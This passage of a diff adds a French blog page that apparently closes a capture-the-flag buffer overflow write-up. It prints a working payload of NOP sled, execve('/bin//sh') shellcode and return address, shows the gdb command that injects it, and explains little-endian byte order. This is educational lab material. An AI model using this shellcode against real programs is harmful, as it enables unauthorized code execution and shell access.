+print &quot;\x90&quot;*18 + &quot;\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot; + &quot;\xf5\xc4\xff\xff&quot;
+</code></p>
+
+<p>Maintenant nous pouvons supprimer les breakpoints et relancer le programme en injectant notre charge en input. Pour faire cela avec GDB, il suffit de faire :</p>
+
+<pre><code>gdb-peda$ d
+gdb-peda$ r &lt; &lt;(python -c 'print &quot;\x90&quot;*18 + &quot;\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot; + &quot;\xf5\xc4\xff\xff&quot;')
+</code></pre>
+
+<p><img src="/img/gdb_run_payload.jpg" alt="gdb run payload" /></p>
+
+<p>Félicitations à vous !</p>
+
+<p><strong><em>Je n&rsquo;ai pas compris pourquoi nous avions dû inverser l&rsquo;ordre des octets pour l&rsquo;adresse du pool&hellip;</em></strong><br />
+Effectivement, je n&rsquo;ai pas donné d&rsquo;explication sur cette inversion. En informatique, il y a deux façons d&rsquo;écrire une adresse et on appelle cela l&rsquo;<a href="https://fr.wikipedia.org/wiki/Endianness">endianness</a>. Les architectures de processeurs utilisent l&rsquo;une ou l&rsquo;autre :</p>
+
+<ul>
+<li>Big endian : l&rsquo;ordre des octets sont de gauche à droite (octets de poids fort au poids faible). Par exemple <code>0xA0B70708</code> =&gt; <code>A0 B7 07 08</code>.</li>
+<li>Little endian : l&rsquo;ordre des octets sont de droite à gauche (octets de poids faible au poids fort). Par exemple <code>0xA0B70708</code> =&gt; <code>08 07 B7 A0</code>. C&rsquo;est cet ordre qui est <strong>utilisé par les architectures X86</strong>.</li>
+</ul>
+
+  </div>
+  
+
+<div class="navigation navigation-single">
+    
+    <a href="/cybersecu/app_sys_start_gradually/" class="navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">App-Sys: Débuter progressivement</span>
+    </a>
+    
+    
+</div>
+
+
+  
+
+  
+    
+        <div id="disqus_thread"></div>
+<script type="text/javascript">
+    
+
+    (function () {
+    if (location.hostname === "localhost" ||
+      location.hostname === "127.0.0.1" ||
+      location.hostname === "") {
+      return;
+    }
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    var disqus_shortname = 'mycybersharing';
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || 
+      document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+<noscript>
+  Please enable JavaScript to view the
+  <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+</noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by
+  <span class="logo-disqus">Disqus</span>
+</a>
+
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+  
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-134696947-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+<script defer src="https://use.fontawesome.com/releases/v5.5.0/js/all.js" integrity="sha384-GqVMZRt5Gn7tB9D9q7ONtcp4gtHIUEW/yG7h98J7IpE3kpi+srfFyyB/04OV6pG0" crossorigin="anonymous"></script>
+
+
+    
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+        
+    
+    <script type="text/javascript">
+        
+        hljs.initHighlightingOnLoad();
+    </script>
+    
+
+
+
+
+    
+
+
+
+    </body>
+</html>
